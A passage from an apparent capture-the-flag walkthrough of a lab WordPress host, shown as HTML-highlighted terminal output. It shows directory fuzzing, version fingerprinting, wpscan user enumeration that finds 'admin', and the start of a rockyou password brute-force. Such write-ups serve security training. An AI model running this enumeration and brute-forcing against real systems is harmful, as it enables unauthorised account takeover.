&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htpasswd &lt;span class="o">[&lt;/span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 5064ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htaccess &lt;span class="o">[&lt;/span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 6097ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">blog &lt;span class="o">[&lt;/span>Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 58ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">javascript &lt;span class="o">[&lt;/span>Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">phpmyadmin &lt;span class="o">[&lt;/span>Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 341ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">server-status &lt;span class="o">[&lt;/span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 59ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wordpress &lt;span class="o">[&lt;/span>Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>From there I can see that the server is powered by wordpress, and runs javascript.&lt;/p>
&lt;p>So now I am just going to explore these subdirectories more…&lt;/p>
&lt;p>So, for now I have:&lt;/p>
&lt;ul>
&lt;li>Apache 2.4.29&lt;/li>
&lt;li>Wordpress 5.4.2&lt;/li>
&lt;li>MySQL&lt;/li>
&lt;/ul>
&lt;p>They are old version, so maybe I can find something on the internet.&lt;/p>
&lt;p>Also I have 2 login pages:&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="http://internal.thm/blog/wp-login.php" target="_blank" rel="noopener"
>http://internal.thm/blog/wp-login.php&lt;/a>&lt;/li>
&lt;li>http://10.10.186.60/phpmyadmin/&lt;/li>
&lt;/ul>
&lt;p>Now I try to get some information directly trough wordpress, using wpscan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;span class="lnt">71
&lt;/span>&lt;span class="lnt">72
&lt;/span>&lt;span class="lnt">73
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">wpscan --url 10.10.186.60/blog -e u vp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_______________________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> __ _______ _____
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span> / / __ &lt;span class="se">\ &lt;/span>/ ____&lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span> /&lt;span class="se">\ &lt;/span> / /&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>__&lt;span class="o">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>___ ___ __ _ _ __ ®
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \/&lt;/span> &lt;span class="se">\/&lt;/span> / &lt;span class="p">|&lt;/span> ___/ &lt;span class="se">\_&lt;/span>__ &lt;span class="se">\ &lt;/span>/ __&lt;span class="p">|&lt;/span>/ _&lt;span class="sb">`&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="s1">&amp;#39;_ \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> \ /\ / | | ____) | (__| (_| | | | |
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> \/ \/ |_| |_____/ \___|\__,_|_| |_|
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> WordPress Security Scanner by the WPScan Team
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> Version 3.8.25
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> Sponsored by Automattic - https://automattic.com/
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">_______________________________________________________________
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] URL: http://10.10.186.60/blog/ [10.10.186.60]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] Started: Sun Dec 31 15:10:27 2023
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Interesting Finding(s):
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] Headers
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Headers (Passive Detection)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 100%
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] XML-RPC seems to be enabled: http://10.10.186.60/blog/xmlrpc.php
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Direct Access (Aggressive Detection)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 100%
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | References:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - http://codex.wordpress.org/XML-RPC_Pingback_API
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] WordPress readme found: http://10.10.186.60/blog/readme.html
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Direct Access (Aggressive Detection)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 100%
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] The external WP-Cron seems to be enabled: http://10.10.186.60/blog/wp-cron.php
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Direct Access (Aggressive Detection)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 60%
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | References:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.iplocation.net/defend-wordpress-from-ddos
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://github.com/wpscanteam/wpscan/issues/1299
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Emoji Settings (Passive Detection)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - http://10.10.186.60/blog/, Match: &amp;#39;&lt;/span>wp-includes&lt;span class="se">\/&lt;/span>js&lt;span class="se">\/&lt;/span>wp-emoji-release.min.js?ver&lt;span class="o">=&lt;/span>5.4.2&lt;span class="s1">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confirmed By: Meta Generator (Passive Detection)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - http://10.10.186.60/blog/, Match: &amp;#39;&lt;/span>WordPress 5.4.2&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>i&lt;span class="o">]&lt;/span> The main theme could not be detected.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Enumerating Users &lt;span class="o">(&lt;/span>via Passive and Aggressive Methods&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Brute Forcing Author IDs - Time: 00:00:00 &amp;lt;&lt;span class="o">===================================================================================================================================================================================================&lt;/span>&amp;gt; &lt;span class="o">(&lt;/span>&lt;span class="m">10&lt;/span> / 10&lt;span class="o">)&lt;/span> 100.00% Time: 00:00:00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>i&lt;span class="o">]&lt;/span> User&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> Identified:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> admin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> Found By: Author Id Brute Forcing - Author Pattern &lt;span class="o">(&lt;/span>Aggressive Detection&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> Confirmed By: Login Error Messages &lt;span class="o">(&lt;/span>Aggressive Detection&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> No WPScan API Token given, as a result vulnerability data has not been output.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> You can get a free API token with &lt;span class="m">25&lt;/span> daily requests by registering at https://wpscan.com/register
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Finished: Sun Dec &lt;span class="m">31&lt;/span> 15:10:31 &lt;span class="m">2023&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Requests Done: &lt;span class="m">48&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Cached Requests: &lt;span class="m">5&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Data Sent: 11.895 KB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Data Received: 302.953 KB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Memory used: 150.684 MB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Elapsed time: 00:00:03
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Here we can see that I have retrieved an username, Admin!&lt;/p>
&lt;p>Now I can try to retrieve the password:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;span class="lnt">71
&lt;/span>&lt;span class="lnt">72
&lt;/span>&lt;span class="lnt">73
&lt;/span>&lt;span class="lnt">74
&lt;/span>&lt;span class="lnt">75
&lt;/span>&lt;span class="lnt">76
&lt;/span>&lt;span class="lnt">77
&lt;/span>&lt;span class="lnt">78
&lt;/span>&lt;span class="lnt">79
&lt;/span>&lt;span class="lnt">80
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">wpscan --url 10.10.186.60/blog -e u -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_______________________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> __ _______ _____
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span> / / __ &lt;span class="se">\ &lt;/span>/ ____&lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span> /&lt;span class="se">\ &lt;/span> / /&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>__&lt;span class="o">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>___ ___ __ _ _ __ ®
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \/&lt;/span> &lt;span class="se">\/&lt;/span> / &lt;span class="p">|&lt;/span> ___/ &lt;span class="se">\_&lt;/span>__ &lt;span class="se">\ &lt;/span>/ __&lt;span class="p">|&lt;/span>/ _&lt;span class="sb">`&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="s1">&amp;#39;_ \
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> \ /\ / | | ____) | (__| (_| | | | |
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> \/ \/ |_| |_____/ \___|\__,_|_| |_|
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> WordPress Security Scanner by the WPScan Team
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> Version 3.8.25
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> Sponsored by Automattic - https://automattic.com/
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">_______________________________________________________________
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] URL: http://10.10.186.60/blog/ [10.10.186.60]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] Started: Sun Dec 31 15:29:27 2023
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Interesting Finding(s):
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] Headers
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Headers (Passive Detection)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 100%
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] XML-RPC seems to be enabled: http://10.10.186.60/blog/xmlrpc.php
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Direct Access (Aggressive Detection)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 100%
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | References:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - http://codex.wordpress.org/XML-RPC_Pingback_API
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] WordPress readme found: http://10.10.186.60/blog/readme.html
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Direct Access (Aggressive Detection)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 100%
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] The external WP-Cron seems to be enabled: http://10.10.186.60/blog/wp-cron.php
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Direct Access (Aggressive Detection)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 60%
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | References:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.iplocation.net/defend-wordpress-from-ddos
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://github.com/wpscanteam/wpscan/issues/1299
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Emoji Settings (Passive Detection)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - http://10.10.186.60/blog/, Match: &amp;#39;&lt;/span>wp-includes&lt;span class="se">\/&lt;/span>js&lt;span class="se">\/&lt;/span>wp-emoji-release.min.js?ver&lt;span class="o">=&lt;/span>5.4.2&lt;span class="s1">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confirmed By: Meta Generator (Passive Detection)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - http://10.10.186.60/blog/, Match: &amp;#39;&lt;/span>WordPress 5.4.2&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>i&lt;span class="o">]&lt;/span> The main theme could not be detected.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Enumerating Users &lt;span class="o">(&lt;/span>via Passive and Aggressive Methods&lt;span class="o">)&lt;/span>
